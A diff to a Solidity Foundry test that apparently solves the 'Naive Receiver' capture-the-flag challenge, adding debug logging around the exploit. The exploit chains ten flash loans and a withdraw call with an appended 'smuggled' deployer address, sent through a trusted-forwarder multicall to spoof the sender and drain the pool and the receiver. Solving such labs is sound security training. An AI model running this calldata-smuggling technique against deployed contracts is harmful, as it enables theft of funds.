@@ -78,10 +78,24 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
 
-        // NOTE: Create bytes memory called CallDatas that takes 11 arguments
-        bytes;
+        // before executing exploit/multicall
+uint256 prePlayer = weth.balanceOf(player);
+uint256 preReceiver = weth.balanceOf(address(receiver));
+uint256 prePool = weth.balanceOf(address(pool));
+uint256 preRecovery = weth.balanceOf(recovery);
+console.log("=== BEFORE exploit ===");
+console.log("player weth:", prePlayer);
+console.log("receiver weth:", preReceiver);
+console.log("pool weth:", prePool);
+console.log("recovery weth:", preRecovery);
+console.log("");
+console.log("");
+console.log("");
+
+        // NOTE: Create bytes[] memory called callDatas that takes 11 arguments
+        bytes[] memory callDatas = new bytes[](11);
         
-        // NOTE: Create batch of callDatas transactions with 9 flahloan and 1 withdraw
+        // NOTE: Create batch of callDatas transactions with 9 flashloan and 1 withdraw
         for(uint i=0; i<10; i++){
             callDatas[i] = abi.encodeCall(
                 NaiveReceiverPool.flashLoan, 
@@ -89,16 +103,17 @@ contract NaiveReceiverChallenge is Test {
             );
 
             // LOG: show basic info for each flashLoan entry
-            console.log("callDatas[%s] length (bytes):", i, callDatas[i].length);
+        console.log("callDatas[%s] length (bytes):", i, callDatas[i].length);
 
-            // print first 32 bytes (contains selector + part of first arg)
-            bytes32 firstWord;
-            assembly { firstWord := mload(add(callDatas[i], 32)) } // load the first 32-byte word of data
-            console.logBytes32(firstWord);
+        // print first 32 bytes (contains selector + part of first arg)
+        bytes memory tmp = callDatas[i]; // <-- copy to local so assembly can access it
+        bytes32 firstWord;
+        assembly { firstWord := mload(add(tmp, 32)) } // load the first 32-byte word of data
+        console.logBytes32(firstWord);
 
-            // print full calldata as bytes (if not too long)
-            console.log("callDatas[%s] full bytes:", i);
-            console.logBytes(callDatas[i]);
+        // print full calldata as bytes (if not too long)
+        console.log("callDatas[%s] full bytes:", i);
+        console.logBytes(callDatas[i]);
         }
 
         // NOTE: encodeCall = proper calldata 
@@ -112,45 +127,48 @@ contract NaiveReceiverChallenge is Test {
             bytes32(uint256(uint160(deployer))) // smuggle payload
         );
 
-        // LOG: inspect the 11th entry (the one with smuggled payload)
-        console.log("=== inspect callDatas[10] (withdraw + smuggled deployer) ===");
-        console.log("callDatas[10] length (bytes):", callDatas[10].length);
+            // LOG: inspect the 11th entry (the one with smuggled payload)
+    console.log("=== inspect callDatas[10] (withdraw + smuggled deployer) ===");
+    console.log("callDatas[10] length (bytes):", callDatas[10].length);
 
-        // first 32 bytes contains selector (first 4 bytes) + padding; show it
-        bytes32 firstWord10;
-        assembly { firstWord10 := mload(add(callDatas[10], 32)) }
-        console.log("first 32 bytes (callDatas[10]):");
-        console.logBytes32(firstWord10);
+    // first 32 bytes contains selector (first 4 bytes) + padding; show it
+    bytes memory tmp10 = callDatas[10]; // <-- local copy for assembly
+    bytes32 firstWord10;
+    assembly { firstWord10 := mload(add(tmp10, 32)) }
+    console.log("first 32 bytes (callDatas[10]):");
+    console.logBytes32(firstWord10);
 
-        // show full callDatas[10]
-        console.log("callDatas[10] full bytes:");
-        console.logBytes(callDatas[10]);
+    // show full callDatas[10]
+    console.log("callDatas[10] full bytes:");
+    console.logBytes(callDatas[10]);
 
-        // show the last 32-byte word (this should be the smuggled deployer)
-        uint len10 = callDatas[10].length;
-        bytes32 lastWord10;
-        assembly {
-            lastWord10 := mload(add(add(callDatas[10], 32), sub(len10, 32)))
-        }
-        console.log("last 32 bytes (should be deployer as bytes32):");
-        console.logBytes32(lastWord10);
-        
-        // NOTE: builds callData that encodes multicall invocation for the pool contract
-        bytes memory callData; 
-        callData = abi.encodeCall(pool.multicall, callDatas);
+    // show the last 32-byte word (this should be the smuggled deployer)
+    uint len10 = tmp10.length;
+    bytes32 lastWord10;
+    // pointer to data area = tmp10 + 32; last word starts at data + (len - 32)
+    assembly {
+        lastWord10 := mload(add(add(tmp10, 32), sub(len10, 32)))
+    }
+    console.log("last 32 bytes (should be deployer as bytes32):");
+    console.logBytes32(lastWord10);
+    
+    // NOTE: builds callData that encodes multicall invocation for the pool contract
+    bytes memory callData; 
+    callData = abi.encodeCall(pool.multicall, callDatas);
 
-        // LOG: inspect the multicall encoded bytes
-        console.log("=== multicall callData ===");
-        console.log("callData length (bytes):", callData.length);
+    // LOG: inspect the multicall encoded bytes
+    console.log("=== multicall callData ===");
+    console.log("callData length (bytes):", callData.length);
 
-        // show first 32 bytes of multicall (selector + head)
-        bytes32 multicallFirst;
-        assembly { multicallFirst := mload(add(callData, 32)) }
-        console.log("multicall first 32 bytes (selector + head):");
-        console.logBytes32(multicallFirst);
+    // show first 32 bytes of multicall (selector + head)
+    bytes memory cd = callData; // <-- local copy for assembly
+    bytes32 multicallFirst;
+    assembly { multicallFirst := mload(add(cd, 32)) }
+    console.log("multicall first 32 bytes (selector + head):");
+    console.logBytes32(multicallFirst);
 
-        console.log("multicall full bytes (truncated if long):");
-        console.logBytes(callData);
+    console.log("multicall full bytes (truncated if long):");
+    console.logBytes(callData);
 
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
@@ -174,19 +192,22 @@ contract NaiveReceiverChallenge is Test {
         );
 
         // LOG: show Request fields and hashes
+        console.log("");
+        console.log("");
+        console.log("");
         console.log("=== Forwarder Request struct fields ===");
         console.log("from (player):");
         console.logAddress(request.from);
         console.log("to (pool):");
-        console.logAddress(request.to);
+        console.logAddress(request.target);
         console.log("value:");
         console.logUint(uint256(request.value));
         console.log("gas:");
         console.logUint(request.gas);
         console.log("nonce:");
         console.logUint(request.nonce);
-        console.log("validUntil (seconds):");
-        console.logUint(request.validUntil);
+        console.log("deadline (seconds):");
+        console.logUint(request.deadline);
         console.log("request.data length:");
         console.logUint(request.data.length);
 
@@ -216,21 +237,59 @@ contract NaiveReceiverChallenge is Test {
         forwarder.execute(request, signature);
 
         console.log("forwarder.execute completed.");
+
+    // after executing exploit/multicall
+uint256 postPlayer = weth.balanceOf(player);
+uint256 postReceiver = weth.balanceOf(address(receiver));
+uint256 postPool = weth.balanceOf(address(pool));
+uint256 postRecovery = weth.balanceOf(recovery);
+console.log("");
+console.log("");
+console.log("");
+console.log("=== AFTER exploit ===");
+console.log("player weth:", postPlayer);
+console.log("receiver weth:", postReceiver);
+console.log("pool weth:", postPool);
+console.log("recovery weth:", postRecovery);
+
+// print deltas to make it easy to read
+
     }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        // Player must have executed two or less transactions
-        assertLe(vm.getNonce(player), 2);
+    // Player must have executed two or less transactions
+    // (we also print the nonce for debugging)
+    console.log("=== _isSolved diagnostics ===");
+    console.log("player nonce (vm.getNonce):");
+    console.logUint(vm.getNonce(player));
+    // The flashloan receiver contract has been emptied
+    // show balances for quick debugging
+    console.log("weth.balanceOf(player):");
+    console.logUint(weth.balanceOf(player));
+    console.log("weth.balanceOf(address(receiver)):");
+    console.logUint(weth.balanceOf(address(receiver)));
+    // Pool is empty too
+    console.log("weth.balanceOf(address(pool)):");
+    console.logUint(weth.balanceOf(address(pool)));
+    // All funds sent to recovery account
+    console.log("weth.balanceOf(recovery):");
+    console.logUint(weth.balanceOf(recovery));
+    console.log("expected total (WETH_IN_POOL + WETH_IN_RECEIVER):");
+    console.logUint(WETH_IN_POOL + WETH_IN_RECEIVER);
 
-        // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
+    // Player must have executed two or less transactions
+    assertLe(vm.getNonce(player), 2);
 
-        // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+    // The flashloan receiver contract has been emptied
+    assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
 
-        // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
-    }
+    // Pool is empty too
+    assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
+
+    // All funds sent to recovery account
+    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+}
+
 }
